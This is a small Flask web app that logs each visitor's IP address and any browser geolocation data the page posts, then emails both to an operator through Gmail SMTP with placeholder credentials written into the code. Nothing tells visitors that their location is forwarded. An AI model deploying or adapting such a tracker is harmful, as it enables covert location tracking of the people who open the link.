from flask import Flask, request, session, g, redirect, url_for, abort, render_template, flash, jsonify

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#set up the email stuff

def send_email(fromaddr, password, toaddr, subject, body):
    frm = fromaddr
    to = toaddr
    msg = MIMEMultipart()
    msg['From'] = frm
    msg['To'] = to
    msg['Subject'] = subject

    bdy = body
    msg.attach(MIMEText(bdy, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()


app = Flask(__name__)

@app.route('/geo', methods= ['GET', 'POST'])
def geo():
    #get IP of visitor
    visitor_ip = request.remote_addr
    print(visitor_ip)
    send_email("YourGmailGoesHere@gmail.com", "YourGmailPasswordGoesHere", "EmailYouWantToSendGPSInfoTo@whatever.com", "SubjectOfEmail", visitor_ip)

    #return jsonify(visitor_ip), 200
    return render_template('geo.html')



@app.route('/postmethod', methods=['POST'])
def postmethod():

    #Prompt for and get geolocation data 
    data = request.get_json()
    print(data)
    gps = jsonify(data)
    location = gps.get_data(as_text=True)
    send_email("YourGmailGoesHere@gmail.com", "YourGmailPasswordGoesHere", "EmailYouWantToSendGPSInfoTo@whatever.com", "SubjectOfEmail", location)
    return jsonify(data)

if __name__ == "__main__":
    app.run(host='0.0.0.0', ssl_context='adhoc')
